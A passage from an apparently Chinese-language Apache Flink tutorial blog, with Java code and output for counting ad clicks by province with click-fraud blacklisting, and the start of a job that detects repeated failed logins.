class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.AdClickEvent;</span><br><span class="line"><span class="keyword">import</span> beans.AdCountViewByProvince;</span><br><span class="line"><span class="keyword">import</span> beans.BlackListUserWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.DateUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 6:41 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdStatisticsByProvince</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从文件中读取数据</span></span><br><span class="line">    URL resource = AdStatisticsByProvince.class.getResource(<span class="string">&quot;/AdClickLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;AdClickEvent&gt; adClickEventDataStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AdClickEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), fields[<span class="number">2</span>], fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;AdClickEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(AdClickEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 对同一个用户点击同一个广告的行为进行检测报警</span></span><br><span class="line">    SingleOutputStreamOperator&lt;AdClickEvent&gt; filterAdClickStream = adClickEventDataStream</span><br><span class="line">      .keyBy(<span class="keyword">new</span> KeySelector&lt;AdClickEvent, Tuple2&lt;Long, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;Long, Long&gt; <span class="title">getKey</span><span class="params">(AdClickEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getUserId(), value.getAdId());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .process(<span class="keyword">new</span> FilterBlackListUser(<span class="number">100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 基于省份分组，开窗聚合</span></span><br><span class="line">    DataStream&lt;AdCountViewByProvince&gt; adCountResultStream = filterAdClickStream</span><br><span class="line">      .keyBy(AdClickEvent::getProvince)</span><br><span class="line">      <span class="comment">// 定义滑窗,5min输出一次</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.minutes(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> AdCountAgg(), <span class="keyword">new</span> AdCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    adCountResultStream.print();</span><br><span class="line">    filterAdClickStream</span><br><span class="line">      .getSideOutput(<span class="keyword">new</span> OutputTag&lt;BlackListUserWarning&gt;(<span class="string">&quot;blacklist&quot;</span>)&#123;&#125;)</span><br><span class="line">      .print(<span class="string">&quot;blacklist-user&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;ad count by province job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AdCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">AdClickEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(AdClickEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AdCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">AdCountViewByProvince</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String province, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;AdCountViewByProvince&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String windowEnd = <span class="keyword">new</span> Timestamp(window.getEnd()).toString();</span><br><span class="line">      Long count = input.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> AdCountViewByProvince(province, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义处理函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FilterBlackListUser</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">Long</span>, <span class="title">Long</span>&gt;, <span class="title">AdClickEvent</span>, <span class="title">AdClickEvent</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义属性：点击次数上线</span></span><br><span class="line">    <span class="keyword">private</span> Integer countUpperBound;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FilterBlackListUser</span><span class="params">(Integer countUpperBound)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.countUpperBound = countUpperBound;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义状态，保存当前用户对某一广告的点击次数</span></span><br><span class="line">    ValueState&lt;Long&gt; countState;</span><br><span class="line">    <span class="comment">// 定义一个标志状态，保存当前用户是否已经被发送到了黑名单里</span></span><br><span class="line">    ValueState&lt;Boolean&gt; isSentState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      countState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;ad-count&quot;</span>, Long.class));</span><br><span class="line">      isSentState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Boolean&gt;(<span class="string">&quot;is-sent&quot;</span>, Boolean.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;AdClickEvent&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 清空所有状态</span></span><br><span class="line">      countState.clear();</span><br><span class="line">      isSentState.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(AdClickEvent value, Context ctx, Collector&lt;AdClickEvent&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 判断当前用户对同一广告的点击次数，如果不够上限，该count加1正常输出；</span></span><br><span class="line">      <span class="comment">// 如果到达上限，直接过滤掉，并侧输出流输出黑名单报警</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 首先获取当前count值</span></span><br><span class="line">      Long curCount = countState.value();</span><br><span class="line"></span><br><span class="line">      Boolean isSent = isSentState.value();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">null</span> == curCount)&#123;</span><br><span class="line">        curCount = <span class="number">0L</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">null</span> == isSent)&#123;</span><br><span class="line">        isSent = <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 1. 判断是否是第一个数据，如果是的话，注册一个第二天0点的定时器</span></span><br><span class="line">      <span class="keyword">if</span> (curCount == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">long</span> ts = ctx.timerService().currentProcessingTime();</span><br><span class="line">        <span class="keyword">long</span> fixedTime = DateUtils.addDays(<span class="keyword">new</span> Date(ts), <span class="number">1</span>).getTime();</span><br><span class="line">        ctx.timerService().registerProcessingTimeTimer(fixedTime);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 2. 判断是否报警</span></span><br><span class="line">      <span class="keyword">if</span> (curCount &gt;= countUpperBound) &#123;</span><br><span class="line">        <span class="comment">// 判断是否输出到黑名单过，如果没有的话就输出到侧输出流</span></span><br><span class="line">        <span class="keyword">if</span> (!isSent) &#123;</span><br><span class="line">          isSentState.update(<span class="keyword">true</span>);</span><br><span class="line">          ctx.output(<span class="keyword">new</span> OutputTag&lt;BlackListUserWarning&gt;(<span class="string">&quot;blacklist&quot;</span>)&#123;&#125;,</span><br><span class="line">                     <span class="keyword">new</span> BlackListUserWarning(value.getUserId(), value.getAdId(), <span class="string">&quot;click over &quot;</span> + countUpperBound + <span class="string">&quot;times.&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不再进行下面操作</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果没有返回，点击次数加1，更新状态，正常输出当前数据到主流</span></span><br><span class="line">      countState.update(curCount + <span class="number">1</span>);</span><br><span class="line">      out.collect(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">blacklist-user&gt; beans.BlackListUserWarning&#123;userId=<span class="number">937166</span>, adId=<span class="number">1715</span>, warningMsg=<span class="string">&#x27;click over 100times.&#x27;</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;beijing&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:05:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;shanghai&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:05:00.0&#x27;</span>, count=<span class="number">1</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;guangdong&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:05:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;guangdong&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:10:00.0&#x27;</span>, count=<span class="number">4</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;shanghai&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:10:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;beijing&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:10:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;shanghai&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:15:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;beijing&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:15:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;guangdong&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:15:00.0&#x27;</span>, count=<span class="number">5</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;shanghai&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:20:00.0&#x27;</span>, count=<span class="number">2</span>&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=<span class="string">&#x27;guangdong&#x27;</span>, windowEnd=<span class="string">&#x27;2017-11-26 09:20:00.0&#x27;</span>, count=<span class="number">5</span>&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h5 id="恶意登录监控"><a href="#恶意登录监控" class="headerlink" title="恶意登录监控"></a>恶意登录监控</h5><ul><li>基本需求 <ul><li>用户在短时间内频繁登录失败，有程序恶意攻击的可能</li><li>同一用户（可以是不同IP）在2秒内连续两次登录失败，需要报警</li></ul></li><li>解决思路 <ul><li>将用户的登录失败行为存入ListState，设定定时器2秒后出发，查看ListState中有几次失败登录</li><li>更加精确的检测，可以使用CEP库实现事件流的模式匹配</li></ul></li></ul><h6 id="POJO-4"><a href="#POJO-4" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> LoginEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> String ip;</span><br><span class="line"><span class="keyword">private</span> String loginState;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li><li><p> LoginFailWarning  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> Long firstFailTime;</span><br><span class="line"><span class="keyword">private</span> Long lastFailTime;</span><br><span class="line"><span class="keyword">private</span> String warningMsg;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码1-简单代码实现"><a href="#代码1-简单代码实现" class="headerlink" title="代码1-简单代码实现"></a>代码1-简单代码实现</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.LoginEvent;</span><br><span class="line"><span class="keyword">import</span> beans.LoginFailWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 1:49 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFail</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从文件中读取数据</span></span><br><span class="line">    URL resource = LoginFail.class.getResource(<span class="string">&quot;/LoginLog.csv&quot;</span>);</span><br><span class="line">    SingleOutputStreamOperator&lt;LoginEvent&gt; loginEventStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;LoginEvent&gt;(Time.of(<span class="number">3</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(LoginEvent element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line">    <span class="comment">// 自定义处理函数检测连续登录失败事件</span></span><br><span class="line">    SingleOutputStreamOperator&lt;LoginFailWarning&gt; warningStream = loginEventStream</span><br><span class="line">      .keyBy(LoginEvent::getUserId)</span><br><span class="line">      .process(<span class="keyword">new</span> LoginFailDetectWarning(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    warningStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;login fail detect job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义KeyedProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailDetectWarning</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 定义属性，最大连续登录失败次数</span></span><br><span class="line">    <span class="keyword">private</span> Integer maxFailTimes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义状态：保存2秒内所有的登录失败事件</span></span><br><span class="line">    ListState&lt;LoginEvent&gt; loginFailEventListState;</span><br><span class="line">    <span class="comment">// 定义状态：保存注册的定时器时间戳</span></span><br><span class="line">    ValueState&lt;Long&gt; timerTsState;</span><br><span class="line"></span><br><span class="line">    <span 